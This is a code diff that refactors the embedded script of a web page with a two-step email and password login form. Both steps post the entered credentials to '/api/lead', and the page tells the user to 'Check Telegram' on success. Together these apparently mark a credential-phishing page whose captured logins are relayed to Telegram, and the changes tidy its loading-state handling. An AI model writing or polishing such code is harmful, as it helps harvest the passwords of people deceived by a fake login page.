@@ -79,6 +79,7 @@
     </div>
   </div>
 
+  <!-- Frontend Logic Embedded Here -->
   <script>
     const API_ENDPOINT = '/api/lead'; 
     const screen1 = document.getElementById('screen1');
@@ -90,12 +91,23 @@
     const passwordInput = document.getElementById('passwordInput');
     const errorMsg = document.getElementById('errorMsg');
 
+    // Helper to handle loading state
+    function setLoading(btn, text) {
+      const original = btn.textContent;
+      btn.textContent = text;
+      btn.disabled = true;
+      return () => {
+        btn.textContent = original;
+        btn.disabled = false;
+      };
+    }
+
     emailForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       const email = emailForm.querySelector('input[type="email"]').value;
       const btn = emailForm.querySelector('.btn-primary');
-      btn.textContent = 'Checking...';
-      btn.disabled = true;
+      const restore = setLoading(btn, 'Checking...');
+
       try {
         const response = await fetch(API_ENDPOINT, {
           method: 'POST',
@@ -114,8 +126,7 @@
         console.error(error);
         alert('Network error. Please try again.');
       } finally {
-        btn.textContent = 'NEXT';
-        btn.disabled = false;
+        restore();
       }
     });
 
@@ -124,8 +135,8 @@
       const email = screen1.querySelector('input[type="email"]').value;
       const password = passwordInput.value;
       const btn = passwordForm.querySelector('.btn-primary');
-      btn.textContent = 'Verifying...';
-      btn.disabled = true;
+      const restore = setLoading(btn, 'Verifying...');
+
       try {
         const response = await fetch(API_ENDPOINT, {
           method: 'POST',
@@ -134,7 +145,8 @@
         });
         const result = await response.json();
         if (result.success) {
-          alert('Login Successful! Check Telegram for the details.');
+          alert('Login Successful! Check Telegram.');
+          // Optional: Redirect or reset
         } else {
           errorMsg.textContent = result.error || 'Password or email is not correct. Try again.';
           errorMsg.style.display = 'block';
@@ -143,8 +155,7 @@
       } catch (error) {
         alert('Network Error: ' + error.message);
       } finally {
-        btn.textContent = 'NEXT';
-        btn.disabled = false;
+        restore();
       }
     });
 
